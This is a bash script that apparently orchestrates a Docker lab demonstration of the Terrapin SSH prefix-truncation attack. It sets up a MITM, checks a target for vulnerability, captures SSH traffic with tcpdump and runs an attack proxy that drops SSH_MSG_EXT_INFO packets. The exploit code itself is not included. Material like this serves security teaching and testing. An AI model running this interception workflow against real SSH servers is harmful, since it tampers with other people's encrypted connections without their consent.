#!/bin/bash
# Automated Terrapin Attack Demonstration Script

set -e

echo "=========================================="
echo "Terrapin Attack - Automated Demo"
echo "=========================================="
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

print_step() {
    echo -e "${GREEN}[Step $1]${NC} $2"
}

print_info() {
    echo -e "${YELLOW}[Info]${NC} $1"
}

print_error() {
    echo -e "${RED}[Error]${NC} $1"
}

# Check if running in attacker container
if [ ! -d "/attack" ]; then
    print_error "This script should be run inside the attacker container"
    echo "Run: docker exec -it terrapin-attacker /attack/demo/run_attack.sh"
    exit 1
fi

cd /attack

# Step 1: Setup MITM
print_step "1" "Setting up MITM configuration..."
./mitm_setup.sh

echo ""
read -p "Press Enter to continue to vulnerability check..."
echo ""

# Step 2: Check vulnerability
print_step "2" "Checking if target server is vulnerable..."
python3 poc_exploit/terrapin_exploit.py --target vulnerable-server --port 22 --check-only

if [ $? -ne 0 ]; then
    print_error "Target does not appear to be vulnerable or unreachable"
    exit 1
fi

echo ""
read -p "Press Enter to continue to attack demonstration..."
echo ""

# Step 3: Start packet capture in background
print_step "3" "Starting packet capture..."
CAPTURE_FILE="/attack/captures/demo_capture_$(date +%Y%m%d_%H%M%S).pcap"
tcpdump -i any -w "$CAPTURE_FILE" port 22 &
TCPDUMP_PID=$!
print_info "Capture running (PID: $TCPDUMP_PID)"
sleep 2

echo ""
print_step "4" "Starting Terrapin attack proxy..."
print_info "The attack proxy will listen on port 2222"
print_info "In another terminal, run:"
print_info "  docker exec -it terrapin-client python3 /client/test_client.py --host attacker --port 2222"
echo ""
print_info "The proxy will intercept and drop SSH_MSG_EXT_INFO packets"
print_info "Press Ctrl+C to stop the attack proxy"
echo ""

# Start the attack
python3 poc_exploit/terrapin_exploit.py --target vulnerable-server --port 22 --proxy-port 2222 --verbose

# Cleanup
print_info "Stopping packet capture..."
kill $TCPDUMP_PID 2>/dev/null || true
sleep 1

echo ""
print_step "5" "Attack demonstration complete!"
print_info "Capture file saved to: $CAPTURE_FILE"
echo ""
print_info "To analyze the capture:"
print_info "  tshark -r $CAPTURE_FILE -Y 'ssh' -V"
echo ""
